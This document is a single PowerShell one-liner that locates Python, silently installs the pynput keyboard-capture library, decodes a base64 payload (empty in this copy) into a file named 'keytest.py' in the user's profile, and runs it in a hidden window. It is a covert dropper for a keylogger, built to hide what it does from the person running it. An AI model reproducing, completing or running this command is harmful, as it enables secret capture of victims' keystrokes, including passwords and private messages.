powershell -Command "$pyCmd=Get-Command python.exe,python3.exe,py.exe -ErrorAction SilentlyContinue|Select -First 1;if(-not$pyCmd){exit};$pyPath=$pyCmd.Source;&$pyPath -m pip install pynput --quiet --disable-pip-version-check 2>$null;$scriptPath=Join-Path $env:USERPROFILE 'keytest.py';$b64='';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))|Set-Content -Path $scriptPath -Encoding UTF8;Start-Process -WindowStyle Hidden -FilePath $pyPath -ArgumentList $scriptPath"
